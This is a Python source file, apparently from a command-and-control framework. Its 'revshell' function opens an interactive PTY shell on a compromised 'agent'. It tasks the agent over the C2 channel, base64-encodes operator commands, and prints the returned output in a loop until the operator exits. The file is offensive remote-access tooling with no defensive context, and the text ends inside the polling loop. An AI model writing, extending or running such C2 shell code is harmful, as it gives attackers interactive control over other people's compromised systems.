import base64
import sys
import time
import re
from colorama import Fore, Style


def strip_ansi(text):
    return re.sub(r"\x1b\[[0-9;]*[a-zA-Z]", "", text)


def revshell(manager, agent_id, c2_server):
    print(f"{Fore.CYAN}[*] Starting PTY shell (old C2 method){Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Type 'exit' to return{Style.RESET_ALL}")
    print()

    # Send SHELL: to init PTY on agent
    tid = manager.send_task(agent_id, "SHELL:", {})
    if not tid:
        print("[!] Agent not found")
        return

    # Wait for SHELL:ready response
    ready = False
    for _ in range(20):
        time.sleep(0.5)
        results = manager.get_results(agent_id)
        for r in results:
            out = r.get("output", "")
            if out.startswith("SHELL:ready:"):
                data = strip_ansi(base64.b64decode(out[11:]).decode(errors="replace"))
                sys.stdout.write(data)
                sys.stdout.flush()
                ready = True
                break
        if ready:
            break
    if not ready:
        print("[!] Shell failed to start")
        return

    while True:
        try:
            cmd = input()
        except (EOFError, KeyboardInterrupt):
            print()
            break

        if cmd.strip() in ("exit", "quit"):
            break
        if not cmd.strip():
            continue

        b64cmd = base64.b64encode(cmd.encode()).decode()
        tid = manager.send_task(agent_id, f"SHELL_CMD:{b64cmd}", {})
        if not tid:
            break

        # Poll for result and drain output
        got_output = False
        for _ in range(30):
            time.sleep(0.3)
            results = manager.get_results(agent_id)
            for r in results:
                out = r.get("output", "")
                if r.get("task_id") == tid:
                    try:
                        data = strip_ansi(base64.b64decode(out).decode(errors="replace"))
                    except Exception:
                        data = out
                    sys.stdout.write(data)
                    sys.stdout.flush()
                    got_output = True
                elif out.startswith("SHELL_DRAIN:"):
                    try:
                        data = strip_ansi(base64.b64decode(out[12:]).decode(errors="replace"))
                        sys.stdout.write(data)
                        sys.stdout.flush()
                    except Exception:
                        pass
                elif out.startswith("SHELL:exited"):
                    print("\n[+] Shell exited")
                    return
                r["output"] = ""
